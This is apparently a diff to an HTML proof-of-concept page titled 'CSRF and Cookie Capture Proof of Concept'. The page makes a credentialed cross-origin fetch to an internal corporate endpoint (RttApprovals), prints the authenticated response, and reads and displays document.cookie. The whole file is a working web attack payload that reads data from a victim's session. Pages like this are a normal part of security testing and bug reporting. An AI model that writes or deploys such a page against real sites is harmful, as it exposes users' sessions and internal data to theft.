@@ -1,17 +1,37 @@
+<!DOCTYPE html>
 <html>
 <body>
+<h2>CSRF and Cookie Capture Proof of Concept</h2>
+<div id="cookieData"></div>
+<pre id="responseData"></pre>
+
 <script>
+// Attempt to capture cookies
+function captureCookies() {
+    let cookieStr = document.cookie;
+    document.getElementById('cookieData').innerHTML = '<strong>Captured Cookies:</strong><br>' + cookieStr;
+    
+    document.cookie.split(';').forEach(cookie => console.log(cookie.trim()));
+}
+
+// Make the fetch request
 fetch('https://internal.horizonnut.com/RTT/RttApprovals', {
-  method: 'GET',
-  mode: 'cors',
-  credentials: 'include'
+    method: 'GET',
+    mode: 'cors',
+    credentials: 'include'
 })
 .then(response => response.text())
 .then(data => {
-  console.log(data);
-  document.body.innerHTML = '<pre>' + data + '</pre>';
+    console.log(data);
+    document.getElementById('responseData').textContent = data;
+    captureCookies();
 })
-.catch(error => console.error('Error:', error));
+.catch(error => {
+    console.error('Error:', error);
+    document.getElementById('responseData').textContent = 'Error: ' + error;
+});
+
+window.onload = captureCookies;
 </script>
 </body>
 </html>
